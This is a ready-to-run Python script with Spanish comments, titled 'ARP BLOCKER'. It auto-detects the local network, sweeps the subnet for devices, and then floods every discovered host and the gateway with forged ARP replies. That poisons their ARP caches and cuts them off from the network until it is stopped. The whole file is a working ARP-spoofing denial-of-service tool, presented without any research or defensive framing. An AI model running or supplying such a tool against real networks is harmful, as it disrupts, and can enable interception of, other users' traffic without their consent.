from scapy.all import ARP, Ether, sendp, srp, get_if_hwaddr, conf, IFACES
import time
import sys
import socket
import subprocess

# ─────────────────────────────────────────────
#  SIN CONFIGURACION MANUAL — todo es automatico
# ─────────────────────────────────────────────
INTERVALO = 1.5  # Segundos entre ciclos de spoofing


def detectar_red():
    """Detecta automaticamente la interfaz activa, IP propia, gateway y rango."""

    # Obtener IP propia y gateway via routing
    try:
        # Truco: conectar UDP (sin enviar nada) para saber que interfaz usa el SO
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        mi_ip = s.getsockname()[0]
        s.close()
    except Exception:
        print("[!] No se pudo determinar la IP local. Verifica tu conexion.")
        sys.exit(1)

    # Obtener gateway desde la tabla de rutas del SO
    gateway = None
    try:
        # Windows
        resultado = subprocess.check_output("ipconfig", encoding="cp850", errors="ignore")
        en_adaptador = False
        for linea in resultado.splitlines():
            if mi_ip in linea:
                en_adaptador = True
            if en_adaptador and "Puerta de enlace" in linea or (en_adaptador and "Default Gateway" in linea):
                partes = linea.split(":")
                if len(partes) > 1:
                    gw = partes[-1].strip()
                    if gw and gw != "" and "." in gw:
                        gateway = gw
                        break
    except Exception:
        pass

    if not gateway:
        # Fallback: asumir .1 en la misma subred
        partes = mi_ip.split(".")
        gateway = f"{partes[0]}.{partes[1]}.{partes[2]}.1"
        print(f"[!] No se pudo leer el gateway automaticamente, asumiendo {gateway}")

    # Calcular rango /24
    partes = mi_ip.split(".")
    rango = f"{partes[0]}.{partes[1]}.{partes[2]}.0/24"

    # Encontrar la interfaz scapy que tiene esa IP
    interfaz_guid = None
    for k, v in IFACES.items():
        try:
            if hasattr(v, 'ip') and v.ip == mi_ip:
                interfaz_guid = k
                nombre = getattr(v, 'name', k)
                break
        except Exception:
            continue

    if not interfaz_guid:
        print("[!] No se encontro la interfaz con IP", mi_ip)
        print("    Interfaces disponibles:")
        for k, v in IFACES.items():
            print(f"      {k} -> {getattr(v, 'name', '?')} | {getattr(v, 'ip', '?')}")
        sys.exit(1)

    return interfaz_guid, mi_ip, gateway, rango, nombre


def escanear_red(rango, interfaz, mi_ip, gateway):
    """ARP sweep para descubrir dispositivos activos."""
    print(f"[*] Escaneando {rango}...")
    paquete = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=rango)
    respondidos, _ = srp(paquete, iface=interfaz, timeout=3, verbose=False)

    dispositivos = []
    for _, resp in respondidos:
        ip  = resp[ARP].psrc
        mac = resp[ARP].hwsrc
        if ip in (gateway, mi_ip):
            continue
        dispositivos.append({"ip": ip, "mac": mac})
        print(f"    [+] {ip}  |  {mac}")

    return dispositivos


def obtener_mac(ip, interfaz):
    paquete = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    resp, _ = srp(paquete, iface=interfaz, timeout=2, verbose=False)
    if resp:
        return resp[0][1].hwsrc
    return None


def spoof(ip_objetivo, mac_objetivo, ip_suplantada, mi_mac, interfaz):
    paquete = Ether(dst=mac_objetivo) / ARP(
        op    = 2,
        pdst  = ip_objetivo,
        hwdst = mac_objetivo,
        psrc  = ip_suplantada,
        hwsrc = mi_mac
    )
    sendp(paquete, iface=interfaz, verbose=False)


def restaurar(dispositivos, gateway, mac_gateway, interfaz):
    print("\n[*] Restaurando tablas ARP...")
    for d in dispositivos:
        p1 = Ether(dst=d["mac"]) / ARP(
            op=2, pdst=d["ip"], hwdst=d["mac"],
            psrc=gateway, hwsrc=mac_gateway
        )
        p2 = Ether(dst=mac_gateway) / ARP(
            op=2, pdst=gateway, hwdst=mac_gateway,
            psrc=d["ip"], hwsrc=d["mac"]
        )
        sendp([p1, p2], iface=interfaz, count=5, verbose=False)
        print(f"    [+] Restaurado -> {d['ip']}")
    print("[*] Listo.")


def main():
    print("=" * 55)
    print("       ARP BLOCKER — Modo Automatico")
    print("=" * 55)

    # Auto-detectar todo
    interfaz, mi_ip, gateway, rango, nombre_iface = detectar_red()
    print(f"[+] Interfaz : {nombre_iface}")
    print(f"[+] Mi IP    : {mi_ip}")
    print(f"[+] Gateway  : {gateway}")
    print(f"[+] Rango    : {rango}\n")

    mi_mac = get_if_hwaddr(interfaz)

    # Obtener MAC del gateway
    mac_gateway = obtener_mac(gateway, interfaz)
    if not mac_gateway:
        print(f"[!] No se pudo obtener la MAC del gateway ({gateway})")
        sys.exit(1)
    print(f"[+] MAC Gateway : {mac_gateway}\n")

    # Escanear red
    dispositivos = escanear_red(rango, interfaz, mi_ip, gateway)

    if not dispositivos:
        print("[!] No se encontraron otros dispositivos en la red.")
        sys.exit(0)

    print(f"\n[!] {len(dispositivos)} dispositivo(s) a bloquear")
    print("[!] Iniciando — Ctrl+C para detener y restaurar\n")

    ciclos = 0
    try:
        while True:
            # Re-escanear cada 30 ciclos
            if ciclos % 30 == 0 and ciclos != 0:
                print("\n[*] Re-escaneando...")
                nuevos = escanear_red(rango, interfaz, mi_ip, gateway)
                ips_actuales = {d["ip"] for d in dispositivos}
                for d in nuevos:
                    if d["ip"] not in ips_actuales:
                        dispositivos.append(d)
                        print(f"    [+] Nuevo dispositivo -> {d['ip']}")

            for d in dispositivos:
                spoof(d["ip"],  d["mac"],   gateway, mi_mac, interfaz)
                spoof(gateway, mac_gateway, d["ip"], mi_mac, interfaz)

            ciclos += 1
            print(f"\r[*] Ciclo {ciclos} — {len(dispositivos)} bloqueado(s)", end="", flush=True)
            time.sleep(INTERVALO)

    except KeyboardInterrupt:
        restaurar(dispositivos, gateway, mac_gateway, interfaz)


if __name__ == "__main__":
    main()
